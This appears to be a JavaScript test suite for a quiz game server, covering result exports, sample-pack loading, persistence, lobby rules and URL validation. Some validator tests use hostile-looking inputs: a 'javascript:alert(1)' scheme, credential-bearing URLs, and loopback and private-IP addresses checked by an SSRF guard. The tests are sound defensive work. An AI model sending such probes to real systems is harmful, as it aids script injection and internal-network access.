    // Q2 correct=2 — eliminated player picks right (2). Should land in CSV
    // as "correct (eliminated)".
    p1.send(JSON.stringify({ type: 'player:answer', answerIndex: 2 }));
    await until(s => s.liveAnswerTally && s.liveAnswerTally.answeredEliminated === 1);
    fire('close-question');
    await until(s => s.phase === 'reveal');
    fire('next-question');
    await until(s => s.phase === 'question' && s.questionIndex === 2);
    // Q3 correct=2 — eliminated player picks 0 (wrong, still answered).
    p1.send(JSON.stringify({ type: 'player:answer', answerIndex: 0 }));
    await until(s => s.liveAnswerTally && s.liveAnswerTally.answeredEliminated === 1);
    fire('close-question');
    await until(s => s.phase === 'reveal');
    // Q4: player skips entirely (no answer).
    fire('next-question');
    await until(s => s.phase === 'question' && s.questionIndex === 3);
    fire('close-question');
    await until(s => s.phase === 'reveal');

    // Fetch CSV. Use the same cookie helper.
    const r = await request('GET', '/results.csv', { headers: { Cookie: a.cookie } });
    ok(r.status === 200, '/results.csv → 200');
    const lines = r.body.split('\r\n').filter(Boolean);
    ok(lines.length >= 2, 'CSV has header + at least one data row');
    const header = lines[0];
    ok(header.includes('"Total correct (all answers)"'), 'header has Total correct');
    ok(header.includes('"Total answered"'),              'header has Total answered');
    ok(header.includes('"Q1 answer"') && header.includes('"Q1 result"'), 'header has Q1 answer + result');
    ok(header.includes('"Q10 answer"'),                  'header has Q10 answer (10 main questions)');
    ok(header.includes('"B1 answer"') && header.includes('"B5 answer"'), 'header has B1..B5 bonus columns');

    const playerRow = lines[1];
    ok(playerRow.includes('"CSV Test"'),        'player name in row');
    ok(playerRow.includes('"A"'),               'Q1 answer "A" recorded');
    ok(playerRow.includes('"wrong"'),           'Q1 result includes "wrong"');
    ok(playerRow.includes('"C"'),               'Q2 answer "C" recorded (eliminated player still answered)');
    ok(playerRow.includes('"correct (eliminated)"'),  'Q2 result tagged as eliminated');
    ok(playerRow.includes('"wrong (eliminated)"'),    'Q3 result tagged as eliminated');
    ok(playerRow.includes('"no answer"'),       'Q4 result "no answer" recorded');
    ok(playerRow.includes('"—"'),               'Q4 answer placeholder "—"');

    // Reset to default so subsequent tests aren't affected.
    ws.send(JSON.stringify({ type: 'admin:action', action: 'branding:update', payload: { branding: { eliminatedCanAnswer: false } } }));
    await waitMessage(ws, m => m.type === 'branding:saved');
    try { ws.close(); p1.close(); } catch {}
  }

  section('Sample packs: fetchJsonSafe rejections (URL guard)');
  {
    async function shouldReject(promise, matchRe, label) {
      try { await promise; ok(false, label + ' (expected throw, got success)'); }
      catch (e) { ok(matchRe.test(e.message), label + ' (' + e.message + ')'); }
    }
    await shouldReject(fetchJsonSafe('http://example.com/x'),     /https/,                    'http:// rejected');
    await shouldReject(fetchJsonSafe('https://localhost/x'),      /(loopback|private)/i,      'https://localhost rejected');
    await shouldReject(fetchJsonSafe('https://127.0.0.1/x'),      /(loopback)/i,              'https://127.0.0.1 rejected');
    await shouldReject(fetchJsonSafe('https://192.168.1.1/x'),    /(loopback|private)/i,      'https://192.168.* rejected');
    await shouldReject(fetchJsonSafe('https://10.0.0.5/x'),       /(loopback|private)/i,      'https://10.0.0.* rejected');
    await shouldReject(fetchJsonSafe('https://172.16.0.5/x'),     /private/,                  'https://172.16.* rejected');
    await shouldReject(fetchJsonSafe('not a url at all'),         /invalid/,                  'garbage URL rejected');
    await shouldReject(fetchJsonSafe('ftp://example.com/x'),      /https/,                    'ftp:// rejected');
  }

  // (Note: the samples:list + samples:load integration test was moved to AFTER
  // the XLSX test below — it dirty-resets the game which would wipe the player
  // history the XLSX test depends on.)

  section('XLSX export: valid zip + styled cells');
  {
    // Re-use the same admin WS pattern from the test above. Game state was
    // already populated (CSV test left a 1-player game in 'reveal' on Q4).
    const a = await loginAs('admin', process.env.ADMIN_TOKEN);
    const r = await request('GET', '/results.xlsx', { headers: { Cookie: a.cookie } });
    ok(r.status === 200, '/results.xlsx → 200');
    ok((r.headers['content-type'] || '').includes('spreadsheetml'), 'Content-Type is XLSX');
    ok((r.headers['content-disposition'] || '').includes('.xlsx'), 'filename has .xlsx extension');

    // Use the raw Buffer (not the UTF-8-decoded body, which mangles binary).
    const body = r.buffer;
    ok(body.length > 200, 'xlsx body is non-trivial size: ' + body.length + ' bytes');
    // ZIP local-file-header magic: 'PK\x03\x04' (0x04034b50 little-endian).
    ok(body[0] === 0x50 && body[1] === 0x4b && body[2] === 0x03 && body[3] === 0x04, 'starts with ZIP local-header signature (PK\\x03\\x04)');
    // End-of-central-directory signature 'PK\x05\x06' should be near the end.
    let foundEocd = false;
    for (let i = body.length - 22; i >= Math.max(0, body.length - 1024); i--) {
      if (body[i] === 0x50 && body[i+1] === 0x4b && body[i+2] === 0x05 && body[i+3] === 0x06) { foundEocd = true; break; }
    }
    ok(foundEocd, 'ends with EOCD signature (PK\\x05\\x06)');

    // Quick parse: the central directory lists file names — make sure we ship
    // all the expected parts.
    const text = body.toString('latin1');
    ['[Content_Types].xml', '_rels/.rels', 'xl/workbook.xml',
     'xl/_rels/workbook.xml.rels', 'xl/styles.xml', 'xl/worksheets/sheet1.xml'
    ].forEach(name => {
      ok(text.includes(name), 'archive contains ' + name);
    });

    // Decompress the sheet to verify cell content. Use unzip via zlib.
    const zlib = require('zlib');
    // Find sheet1.xml local-file header by signature + name; reading the
    // compressed payload requires the offset + sizes from the central
    // directory. Simpler approach: decode the LFH directly.
    function extract(buf, fileName) {
      const target = Buffer.from(fileName, 'utf8');
      for (let i = 0; i < buf.length - 30; i++) {
        if (buf[i] === 0x50 && buf[i+1] === 0x4b && buf[i+2] === 0x03 && buf[i+3] === 0x04) {
          const nameLen = buf.readUInt16LE(i + 26);
          const extraLen = buf.readUInt16LE(i + 28);
          const name = buf.slice(i + 30, i + 30 + nameLen);
          if (name.equals(target)) {
            const compMethod = buf.readUInt16LE(i + 8);
            const compSize = buf.readUInt32LE(i + 18);
            const dataStart = i + 30 + nameLen + extraLen;
            const compressed = buf.slice(dataStart, dataStart + compSize);
            return compMethod === 0 ? compressed : zlib.inflateRawSync(compressed);
          }
        }
      }
      return null;
    }
    const sheet = extract(body, 'xl/worksheets/sheet1.xml');
    ok(sheet && sheet.length > 100, 'sheet1.xml extracted from archive');
    const sheetText = sheet.toString('utf8');
    ok(sheetText.includes('<sheetData>'), 'sheet1.xml has sheetData');
    ok(sheetText.includes('Q1 answer') && sheetText.includes('Q1 result'), 'sheet1.xml has per-question columns');
    ok(sheetText.includes('Total correct (all answers)'), 'sheet1.xml has summary columns');
    // The "CSV Test" player from the prior test should show up here. Style
    // ids should be present too (s="2" for green correct, s="3" for red wrong).
    ok(/s="(2|3|4|5|6)"/.test(sheetText), 'sheet1.xml has at least one styled per-question cell');

    // Make sure the styles part defines the green and red fills.
    const styles = extract(body, 'xl/styles.xml').toString('utf8');
    ok(styles.includes('FFC6EFCE'), 'styles.xml defines green fill (#C6EFCE)');
    ok(styles.includes('FFFFC7CE'), 'styles.xml defines red fill (#FFC7CE)');
    ok(styles.includes('FFFFEB9C'), 'styles.xml defines amber fill (#FFEB9C)');
  }

  section('Sample packs: samples:list + samples:load round-trip');
  {
    // Stub global.fetch so the test doesn't actually hit the network.
    const MANIFEST_URL = 'https://samples.test/manifest.json';
    const PACK_URL     = 'https://samples.test/nature.json';
    const BAD_PACK_URL = 'https://samples.test/bad.json';
    const EMPTY_PACK_URL = 'https://samples.test/empty.json';
    const fakeManifest = {
      packs: [
        { id: 'nature', title: 'Nature Quiz', category: 'nature', description: 'Test pack', url: PACK_URL, questions: 1, bonus: 1 },
        { id: 'bad', title: 'Bad Quiz', category: 'bad', description: 'Malformed pack', url: BAD_PACK_URL, questions: 1, bonus: 0 },
        { id: 'empty', title: 'Empty Quiz', category: 'empty', description: 'No main bank', url: EMPTY_PACK_URL, questions: 0, bonus: 1 },
      ],
    };
    const fakePack = {
      title: 'Nature Quiz',
      category: 'nature',
      tagline: 'Wildlife & Ecosystems',
      main:  [{ q: 'Largest mammal?', options: ['Elephant','Blue whale','T-rex','Croc'], correct: 1, lesson: 'Blue whales!' }],
      bonus: [{ q: 'Bonus Q',          options: ['A','B','C','D'],                       correct: 0, lesson: 'Bonus L' }],
    };
    const fakeBadPack = {
      title: 'Bad Quiz',
      category: 'bad',
      main: [{ q: 'Malformed?', options: ['A','B','C'], correct: 0, lesson: 'Missing an option' }],
      bonus: []
    };
    const fakeEmptyPack = {
      title: 'Empty Quiz',
      category: 'empty',
      main: [],
      bonus: [{ q: 'Bonus only?', options: ['A','B','C','D'], correct: 0, lesson: 'No main bank' }]
    };
    const origFetch = global.fetch;
    global.fetch = async (url) => {
      const body = url === MANIFEST_URL ? fakeManifest
                 : url === PACK_URL     ? fakePack
                 : url === BAD_PACK_URL ? fakeBadPack
                 : url === EMPTY_PACK_URL ? fakeEmptyPack
                 : null;
      if (!body) return { ok: false, status: 404 };
      const bytes = Buffer.from(JSON.stringify(body));
      let yielded = false;
      const reader = {
        read: async () => yielded ? { done: true } : (yielded = true, { value: bytes, done: false }),
      };
      return { ok: true, status: 200, headers: { get: () => 'application/json' }, body: { getReader: () => reader } };
    };
    try {
      const a = await loginAs('admin', process.env.ADMIN_TOKEN);
      const ws = await openWs({ cookie: a.cookie });
      const adminLatest = { state: null };
      ws.on('message', raw => { try { const m = JSON.parse(raw); if (m.type === 'admin:state') adminLatest.state = m.state; } catch {} });
      ws.send(JSON.stringify({ type: 'admin:hello' }));
      await waitMessage(ws, m => m.type === 'admin:init');
      async function until(pred, timeout = 4000) {
        const start = Date.now();
        while (Date.now() - start < timeout) {
          if (adminLatest.state && pred(adminLatest.state)) return adminLatest.state;
          await new Promise(r => setTimeout(r, 30));
        }
        throw new Error('until() timed out');
      }
      function fire(action) { ws.send(JSON.stringify({ type: 'admin:action', action: 'game:host-action', payload: { hostAction: action, hostPayload: {} } })); }

      fire('reset-game');
      await until(s => s.phase === 'lobby');

      // 1. samples:list returns the manifest.
      ws.send(JSON.stringify({ type: 'admin:action', action: 'samples:list', payload: {} }));
      const list = await waitMessage(ws, m => m.type === 'samples:list' || m.type === 'error', 3000);
      ok(list.type === 'samples:list', 'samples:list returned (no error: ' + (list.error || '') + ')');
      ok(Array.isArray(list.packs) && list.packs.length === 3, 'manifest returned 3 packs');
      ok(list.packs[0].id === 'nature', 'pack id surfaced');
      ok(list.packs[0].category === 'nature', 'pack category surfaced');
      ok(list.sourceUrl === MANIFEST_URL, 'sourceUrl echoed back');

      // 2. samples:load fetches the pack and replaces banks.
      ws.send(JSON.stringify({ type: 'admin:action', action: 'samples:load', payload: { packId: 'nature' } }));
      const loaded = await waitMessage(ws, m => m.type === 'samples:loaded' || m.type === 'error', 3000);
      ok(loaded.type === 'samples:loaded', 'samples:loaded returned (no error: ' + (loaded.error || '') + ')');
      ok(loaded.mainCount === 1 && loaded.bonusCount === 1, 'loaded counts match the pack');
      ok(loaded.pack.title === 'Nature Quiz', 'loaded.pack.title');
      ok(loaded.pack.category === 'nature',   'loaded.pack.category');

      // 3. /branding.json reflects the new quizTitle + quizCategory.
      const r = await request('GET', '/branding.json');
      const b = JSON.parse(r.body);
      ok(b.quizTitle === 'Nature Quiz',        '/branding.json quizTitle updated');
      ok(b.quizCategory === 'nature',          '/branding.json quizCategory updated');
      ok(b.tagline === 'Wildlife &amp; Ecosystems', '/branding.json tagline updated (sanitised)');

      // 4. A later partial branding save preserves sample metadata.
      ws.send(JSON.stringify({ type: 'admin:action', action: 'branding:update', payload: { branding: { companyName: 'After Sample Save' } } }));
      const savedBranding = await waitMessage(ws, m => m.type === 'branding:saved' || m.type === 'error', 2000);
      ok(savedBranding.type === 'branding:saved', 'partial branding save after sample load succeeds');
      const r2 = await request('GET', '/branding.json');
      const b2 = JSON.parse(r2.body);
      ok(b2.quizTitle === 'Nature Quiz' && b2.quizCategory === 'nature', 'partial branding save preserves quizTitle + quizCategory');

      // 5. Unknown pack id returns an error.
      ws.send(JSON.stringify({ type: 'admin:action', action: 'samples:load', payload: { packId: 'nonexistent' } }));
      const err = await waitMessage(ws, m => m.type === 'error' || m.type === 'samples:loaded', 2000);
      ok(err.type === 'error' && /not found/.test(err.error || ''), 'unknown pack id rejected');

      // 6. Malformed and empty-main sample packs are rejected instead of partially sanitised.
      ws.send(JSON.stringify({ type: 'admin:action', action: 'samples:load', payload: { packId: 'bad' } }));
      const bad = await waitMessage(ws, m => m.type === 'error' || m.type === 'samples:loaded', 2000);
      ok(bad.type === 'error' && /4 options/i.test(bad.error || ''), 'malformed sample pack rejected');

      ws.send(JSON.stringify({ type: 'admin:action', action: 'samples:load', payload: { packId: 'empty' } }));
      const empty = await waitMessage(ws, m => m.type === 'error' || m.type === 'samples:loaded', 2000);
      ok(empty.type === 'error' && /at least one main/i.test(empty.error || ''), 'empty-main sample pack rejected');

      try { ws.close(); } catch {}
    } finally {
      global.fetch = origFetch;
    }
  }

  section('Live tally: hidden outside question phase');
  {
    const ws = await adminWs();
    fireHost(ws, 'reset-game');
    const s = await awaitState(ws, x => x.phase === 'lobby');
    ok(s.state.liveAnswerTally === null, 'liveAnswerTally is null in lobby phase');
    try { ws.close(); } catch {}
  }
}

// ----------------------------------------------------------------------------
// Empty-start + question persistence
// ----------------------------------------------------------------------------
async function emptyStartTests() {
  section('Empty start: loadQuestionsFromDisk returns empty when file missing');
  try { fs.unlinkSync(QUESTIONS_PATH); } catch {}
  const loaded = loadQuestionsFromDisk();
  ok(loaded.main.length === 0 && loaded.bonus.length === 0, 'missing file → {main:[], bonus:[]}');

  async function adminWs() {
    const a = await loginAs('admin', process.env.ADMIN_TOKEN);
    const ws = await openWs({ cookie: a.cookie });
    ws.send(JSON.stringify({ type: 'admin:hello' }));
    await waitMessage(ws, m => m.type === 'admin:init');
    return ws;
  }

  section('Persistence: questions:update writes data/questions.json');
  {
    const ws = await adminWs();
    ws.send(JSON.stringify({
      type: 'admin:action', action: 'questions:update',
      payload: {
        main:  [{ q: 'Persisted Q', options: ['a','b','c','d'], correct: 0, lesson: 'L' }],
        bonus: [{ q: 'Persisted B', options: ['1','2','3','4'], correct: 1, lesson: 'BL' }]
      }
    }));
    await waitMessage(ws, m => m.type === 'admin:questions', 3000);
    // Allow the synchronous fs.writeFileSync to land — should be instant.
    ok(fs.existsSync(QUESTIONS_PATH), 'questions.json exists on disk');
    const onDisk = JSON.parse(fs.readFileSync(QUESTIONS_PATH, 'utf8'));
    ok(onDisk.main.length === 1 && onDisk.main[0].q === 'Persisted Q', 'disk has the main question');
    ok(onDisk.bonus.length === 1 && onDisk.bonus[0].q === 'Persisted B', 'disk has the bonus question');
    // loadQuestionsFromDisk now reads the same values (simulates fresh boot).
    const reloaded = loadQuestionsFromDisk();
    ok(reloaded.main[0].q === 'Persisted Q', 'loadQuestionsFromDisk restores after a "restart"');
    try { ws.close(); } catch {}
  }

  section('Persistence: questions:reset-defaults also writes to disk');
  {
    const ws = await adminWs();
    ws.send(JSON.stringify({ type: 'admin:action', action: 'questions:reset-defaults' }));
    await waitMessage(ws, m => m.type === 'admin:questions', 3000);
    const onDisk = JSON.parse(fs.readFileSync(QUESTIONS_PATH, 'utf8'));
    ok(onDisk.main.length === 10 && onDisk.bonus.length === 5, 'sample bank persisted (10 main + 5 bonus)');
    try { ws.close(); } catch {}
  }

  section('Start refused when bank is empty');
  {
    const ws = await adminWs();
    // Wipe the bank via admin questions:update.
    ws.send(JSON.stringify({
      type: 'admin:action', action: 'questions:update',
      payload: { main: [], bonus: [] }
    }));
    await waitMessage(ws, m => m.type === 'admin:questions', 3000);

    // Make sure we're in lobby phase by resetting the game.
    ws.send(JSON.stringify({ type: 'admin:action', action: 'game:host-action', payload: { hostAction: 'reset-game' } }));
    // Pump until we see lobby with totalQuestions=0.
    async function next() { return waitMessage(ws, m => m.type === 'admin:state', 1500); }
    let s = await next();
    while (s.state.phase !== 'lobby' || s.state.totalQuestions !== 0) {
      s = await next().catch(() => null);
      if (!s) break;
    }
    ok(s && s.state.phase === 'lobby' && s.state.totalQuestions === 0, 'baseline: lobby + 0 questions');

    // Fire start-game — server should ignore.
    ws.send(JSON.stringify({ type: 'admin:action', action: 'game:host-action', payload: { hostAction: 'start-game' } }));
    await new Promise(r => setTimeout(r, 250));
    // Force a state push via a no-op host action so we can inspect phase.
    ws.send(JSON.stringify({ type: 'admin:action', action: 'game:host-action', payload: { hostAction: 'cancel-lifeline-vote' } }));
    const after = await waitMessage(ws, m => m.type === 'admin:state', 2000);
    ok(after.state.phase === 'lobby', 'start-game refused — phase stayed at lobby');

    try { ws.close(); } catch {}
  }
}

// ----------------------------------------------------------------------------
// Return-to-lobby host action
// ----------------------------------------------------------------------------
async function returnToLobbyTests() {
  // Reset to a clean baseline: admin fires reset-game so any prior tests don't
  // bleed in. Then we drive the game forward and back.
  async function adminWs() {
    const a = await loginAs('admin', process.env.ADMIN_TOKEN);
    const ws = await openWs({ cookie: a.cookie });
    ws.send(JSON.stringify({ type: 'admin:hello' }));
    await waitMessage(ws, m => m.type === 'admin:init');
    // Drain the post-hello admin:state push so subsequent awaitState calls
    // don't accidentally consume the pre-reset (stale joinCode) state. See
    // the equivalent comment in liveTallyTests' adminWs().
    await waitMessage(ws, m => m.type === 'admin:state', 2000).catch(() => null);
    return ws;
  }
  function fireHost(ws, action, payload) {
    ws.send(JSON.stringify({ type: 'admin:action', action: 'game:host-action', payload: { hostAction: action, hostPayload: payload || {} } }));
  }
  async function nextStateAfter(ws) {
    // Some host actions trigger multiple admin:state pushes (pushAll runs
    // host/player/admin). Wait until we get one that arrives shortly after.
    return await waitMessage(ws, m => m.type === 'admin:state', 2000);
  }

  // Earlier tests may have shrunk the question bank (an XSS-sanitisation test
  // wrote a single-question payload). Restore the defaults so the multi-Q flow
  // here doesn't run off the end of the array.
  {
    const ws = await loginAs('admin', process.env.ADMIN_TOKEN);
    const wsClient = await openWs({ cookie: ws.cookie });
    wsClient.send(JSON.stringify({ type: 'admin:hello' }));
    await waitMessage(wsClient, m => m.type === 'admin:init');
    wsClient.send(JSON.stringify({ type: 'admin:action', action: 'questions:reset-defaults' }));
    await waitMessage(wsClient, m => m.type === 'admin:questions', 2000);
    try { wsClient.close(); } catch {}
  }

  // Pump messages until the predicate is satisfied or we time out. Useful when
  // multiple state pushes interleave from pushAll().
  async function awaitState(ws, pred, timeout = 3000) {
    const start = Date.now();
    let last = null;
    while (Date.now() - start < timeout) {
      const m = await waitMessage(ws, x => x.type === 'admin:state', 1000).catch(() => null);
      if (!m) continue;
      last = m;
      if (pred(m.state)) return m;
    }
    throw new Error('awaitState timed out; last state phase=' + (last && last.state.phase) + ' qIdx=' + (last && last.state.questionIndex));
  }

  section('return-to-lobby: happy path (Q1 with players, all alive)');
  {
    const ws = await adminWs();
    fireHost(ws, 'reset-game');
    const s0 = await nextStateAfter(ws);
    const joinCode = s0.state.joinCode;

    const playerWs = await openWs();
    playerWs.send(JSON.stringify({ type: 'player:join', name: 'Test One', email: 'one@test.example', joinCode }));
    await waitMessage(playerWs, m => m.type === 'player:joined');
    // The join triggers pushAll → admin:state with playerCount=1.
    await awaitState(ws, s => s.playerCount === 1 && s.phase === 'lobby');

    fireHost(ws, 'start-game');
    const sQ = await awaitState(ws, s => s.phase === 'question' && s.questionIndex === 0);
    ok(sQ.state.playerCount === 1, 'in Q1 question phase with 1 player');

    fireHost(ws, 'return-to-lobby');
    const sL = await awaitState(ws, s => s.phase === 'lobby');
    ok(sL.state.playerCount === 1, 'player is still joined');
    ok(sL.state.aliveCount === 1, 'player is still alive');
    ok(sL.state.players[0].score === 0, 'player score reset to 0');
    ok(sL.state.players[0].history.length === 0, 'player history cleared');

    try { ws.close(); playerWs.close(); } catch {}
  }

  section('return-to-lobby: refused outside Q1');
  {
    const ws = await adminWs();
    fireHost(ws, 'reset-game');
    const s0 = await nextStateAfter(ws);
    const joinCode = s0.state.joinCode;

    const playerWs = await openWs();
    playerWs.send(JSON.stringify({ type: 'player:join', name: 'Two', email: 'two@test.example', joinCode }));
    await waitMessage(playerWs, m => m.type === 'player:joined');
    await awaitState(ws, s => s.playerCount === 1);

    fireHost(ws, 'start-game');
    await awaitState(ws, s => s.phase === 'question' && s.questionIndex === 0);

    // Player answers Q1 correctly (correct=1), host closes → reveal, then next → Q2.
    playerWs.send(JSON.stringify({ type: 'player:answer', answerIndex: 1 }));
    await new Promise(r => setTimeout(r, 100));
    fireHost(ws, 'close-question');
    await awaitState(ws, s => s.phase === 'reveal');
    fireHost(ws, 'next-question');
    const sQ2 = await awaitState(ws, s => s.phase === 'question' && s.questionIndex === 1);
    ok(sQ2.state.questionIndex === 1, 'now in Q2');

    // Try return-to-lobby — server should ignore. Wait a short while and assert state didn't flip.
    fireHost(ws, 'return-to-lobby');
    await new Promise(r => setTimeout(r, 400));
    // Snapshot whatever state arrives next (or just last known): re-trigger by firing a no-op
    // host action that DOES push state (cancel-lifeline-vote is safe — clears null).
    fireHost(ws, 'cancel-lifeline-vote');
    const sStill = await awaitState(ws, s => s.questionIndex === 1, 1500);
    ok(sStill.state.phase === 'question' && sStill.state.questionIndex === 1, 'return-to-lobby refused outside Q1 (still in Q2)');

    try { ws.close(); playerWs.close(); } catch {}
  }

  section('return-to-lobby: refused when a player has been eliminated');
  {
    const ws = await adminWs();
    fireHost(ws, 'reset-game');
    const s0 = await nextStateAfter(ws);
    const joinCode = s0.state.joinCode;

    const p1 = await openWs(); const p2 = await openWs();
    p1.send(JSON.stringify({ type: 'player:join', name: 'Alpha', email: 'alpha@test.example', joinCode }));
    await waitMessage(p1, m => m.type === 'player:joined');
    p2.send(JSON.stringify({ type: 'player:join', name: 'Bravo', email: 'bravo@test.example', joinCode }));
    await waitMessage(p2, m => m.type === 'player:joined');
    await awaitState(ws, s => s.playerCount === 2);

    fireHost(ws, 'start-game');
    await awaitState(ws, s => s.phase === 'question' && s.questionIndex === 0);

    // p1 answers correctly; p2 doesn't answer → eliminated on close.
    p1.send(JSON.stringify({ type: 'player:answer', answerIndex: 1 }));
    await new Promise(r => setTimeout(r, 100));
    fireHost(ws, 'close-question');
    const sRev = await awaitState(ws, s => s.phase === 'reveal');
    ok(sRev.state.aliveCount < sRev.state.playerCount, 'an elimination happened');

    // Already not in 'question' phase — server check fails on phase first.
    fireHost(ws, 'return-to-lobby');
    await new Promise(r => setTimeout(r, 400));
    fireHost(ws, 'cancel-lifeline-vote');  // no-op state pump
    const after = await awaitState(ws, s => true, 1500);
    ok(after.state.phase !== 'lobby', 'return-to-lobby refused after an elimination (phase did not become lobby)');

    try { ws.close(); p1.close(); p2.close(); } catch {}
  }
}

// ----------------------------------------------------------------------------
// Theme + level-style tests
// ----------------------------------------------------------------------------
async function themeAndLevelTests() {
  section('Theme: validateTheme unit');
  {
    // Valid theme — keys round-trip.
    const ok1 = validateTheme({ gold: '#ff8800', navyDeep: '#001122' });
    ok(ok1.gold === '#ff8800' && ok1.navyDeep === '#001122', 'valid hex values applied');
    ok(ok1.green === DEFAULT_THEME.green, 'unset keys fall back to defaults');

    // 3-digit shortform expands.
    const ok2 = validateTheme({ red: '#f00' });
    ok(ok2.red === '#ff0000', '3-digit shortform expanded');

    // Unknown keys silently dropped.
    const ok3 = validateTheme({ neonPink: '#ff00aa', gold: '#abcdef' });
    ok(!('neonPink' in ok3) && ok3.gold === '#abcdef', 'unknown key dropped, known key kept');

    // Strict mode rejects invalid hex.
    let threw = false;
    try { validateTheme({ gold: 'not a colour' }, { tolerant: false }); } catch { threw = true; }
    ok(threw, 'invalid hex throws in strict mode');
    threw = false;
    try { validateTheme({ red: '#zzzzzz' }, { tolerant: false }); } catch { threw = true; }
    ok(threw, 'non-hex chars throws');

    // Tolerant mode falls back to defaults on bad value.
    const ok4 = validateTheme({ gold: 'not a colour', red: '#abcdef' }, { tolerant: true });
    ok(ok4.gold === DEFAULT_THEME.gold, 'invalid value in tolerant mode → default');
    ok(ok4.red === '#abcdef', 'valid value in tolerant mode → applied');
  }

  section('Theme: persisted via branding:update + reflected in /branding.json');
  {
    const admin = await loginAs('admin', process.env.ADMIN_TOKEN);
    const ws = await openWs({ cookie: admin.cookie });
    ws.send(JSON.stringify({ type: 'admin:hello' }));
    await waitMessage(ws, m => m.type === 'admin:init');
    ws.send(JSON.stringify({
      type: 'admin:action', action: 'branding:update',
      payload: { branding: { theme: { gold: '#ff8800', navyDeep: '#001020' } } }
    }));
    const saved = await waitMessage(ws, m => m.type === 'branding:saved' || m.type === 'error');
    ok(saved.type === 'branding:saved', 'branding:saved with theme override');
    ok(saved.branding.theme.gold === '#ff8800', 'gold persisted');
    ok(saved.branding.theme.navyDeep === '#001020', 'navyDeep persisted');
    ok(saved.branding.theme.green === DEFAULT_THEME.green, 'unset key still default');

    const r = await request('GET', '/branding.json');
    const j = JSON.parse(r.body);
    ok(j.theme && j.theme.gold === '#ff8800', '/branding.json exposes theme');
    try { ws.close(); } catch {}
  }

  section('Theme: invalid hex rejected by admin');
  {
    const admin = await loginAs('admin', process.env.ADMIN_TOKEN);
    const ws = await openWs({ cookie: admin.cookie });
    ws.send(JSON.stringify({ type: 'admin:hello' }));
    await waitMessage(ws, m => m.type === 'admin:init');
    ws.send(JSON.stringify({
      type: 'admin:action', action: 'branding:update',
      payload: { branding: { theme: { gold: 'rainbow' } } }
    }));
    const m = await waitMessage(ws, x => x.type === 'error' || x.type === 'branding:saved');
    ok(m.type === 'error' && /hex|theme/i.test(m.error || ''), 'invalid hex rejected with helpful error');
    try { ws.close(); } catch {}
  }

  section('Level style: validated + persisted');
  {
    const admin = await loginAs('admin', process.env.ADMIN_TOKEN);
    const ws = await openWs({ cookie: admin.cookie });
    ws.send(JSON.stringify({ type: 'admin:hello' }));
    await waitMessage(ws, m => m.type === 'admin:init');

    ws.send(JSON.stringify({
      type: 'admin:action', action: 'branding:update',
      payload: { branding: { levelStyle: 'levels' } }
    }));
    const saved = await waitMessage(ws, m => m.type === 'branding:saved' || m.type === 'error');
    ok(saved.type === 'branding:saved' && saved.branding.levelStyle === 'levels', 'levelStyle "levels" accepted');

    ws.send(JSON.stringify({
      type: 'admin:action', action: 'branding:update',
      payload: { branding: { levelStyle: 'something-else' } }
    }));
    const rejected = await waitMessage(ws, m => m.type === 'error' || m.type === 'branding:saved');
    ok(rejected.type === 'error' && /levelStyle/i.test(rejected.error || ''), 'invalid levelStyle rejected');
    try { ws.close(); } catch {}
  }

  section('Theme + level: round-trip on config.json');
  {
    const onDisk = JSON.parse(fs.readFileSync(CONFIG_PATH, 'utf8'));
    ok(onDisk.theme && typeof onDisk.theme === 'object', 'theme persisted to disk');
    ok(typeof onDisk.levelStyle === 'string', 'levelStyle persisted to disk');
    const loaded = loadBranding();
    ok(loaded.theme.gold === onDisk.theme.gold, 'loadBranding restores theme.gold');
    ok(loaded.levelStyle === onDisk.levelStyle, 'loadBranding restores levelStyle');
  }
}

// ----------------------------------------------------------------------------
// Public base URL tests
// ----------------------------------------------------------------------------
async function publicBaseUrlTests() {
  section('Public base URL: parsePublicBaseUrl normalises and validates');
  ok(parsePublicBaseUrl('https://omegaquiz.example.com')   === 'https://omegaquiz.example.com', 'plain https URL unchanged');
  ok(parsePublicBaseUrl('https://omegaquiz.example.com/')  === 'https://omegaquiz.example.com', 'trailing slash stripped');
  ok(parsePublicBaseUrl('omegaquiz.example.com')           === 'https://omegaquiz.example.com', 'bare hostname → https:// prefix');
  ok(parsePublicBaseUrl('http://localhost:3000')           === 'http://localhost:3000', 'http + port preserved');
  // Protocol heuristic: IPs / localhost default to http://; hostnames default to https://.
  ok(parsePublicBaseUrl('192.168.1.50')                    === 'http://192.168.1.50', 'IPv4 → http (no TLS expected)');
  ok(parsePublicBaseUrl('192.168.1.50:3000')               === 'http://192.168.1.50:3000', 'IPv4:port → http');
  ok(parsePublicBaseUrl('10.0.0.1')                        === 'http://10.0.0.1', 'private IPv4 → http');
  ok(parsePublicBaseUrl('localhost:3000')                  === 'http://localhost:3000', 'localhost → http');
  ok(parsePublicBaseUrl('quiz.local')                      === 'http://quiz.local', 'mDNS .local → http');
  ok(parsePublicBaseUrl('example.com')                     === 'https://example.com', 'public hostname → https');
  ok(parsePublicBaseUrl('subdomain.example.co.uk')         === 'https://subdomain.example.co.uk', 'multi-level hostname → https');
  ok(parsePublicBaseUrl('')                                === '', 'empty string → empty');
  let threw = false;
  try { parsePublicBaseUrl('javascript:alert(1)'); } catch { threw = true; }
  ok(threw, 'javascript: scheme rejected');
  threw = false;
  try { parsePublicBaseUrl('https://user:pass@example.com'); } catch { threw = true; }
  ok(threw, 'embedded credentials rejected');
  threw = false;
  try { parsePublicBaseUrl('https://example.com/somepath'); } catch { threw = true; }
  ok(threw, 'paths rejected');
  threw = false;
  try { parsePublicBaseUrl('not a url at all'); } catch { threw = true; }
  ok(threw, 'garbage rejected');

  section('Public base URL: admin override wins over env var, env over Host header');
  {
    // Start clean: clear current branding override.
    const admin = await loginAs('admin', process.env.ADMIN_TOKEN);
    const ws = await openWs({ cookie: admin.cookie });
    ws.send(JSON.stringify({ type: 'admin:hello' }));
    await waitMessage(ws, m => m.type === 'admin:init');
    ws.send(JSON.stringify({ type: 'admin:action', action: 'branding:update', payload: { branding: { publicBaseUrl: '' } } }));
    await waitMessage(ws, m => m.type === 'branding:saved' || m.type === 'error');

    // Without override and without env var: getPublicBaseUrl() returns localhost fallback.
    const fb = getPublicBaseUrl(null);
    ok(fb.startsWith('http://localhost:'), 'no override + no env → localhost fallback');

    // Set the admin override.
    ws.send(JSON.stringify({ type: 'admin:action', action: 'branding:update', payload: { branding: { publicBaseUrl: 'https://quiz.example.com' } } }));
    const saved = await waitMessage(ws, m => m.type === 'branding:saved' || m.type === 'error');
    ok(saved.type === 'branding:saved' && saved.branding.publicBaseUrl === 'https://quiz.example.com', 'admin override saved');

    const after = getPublicBaseUrl(null);
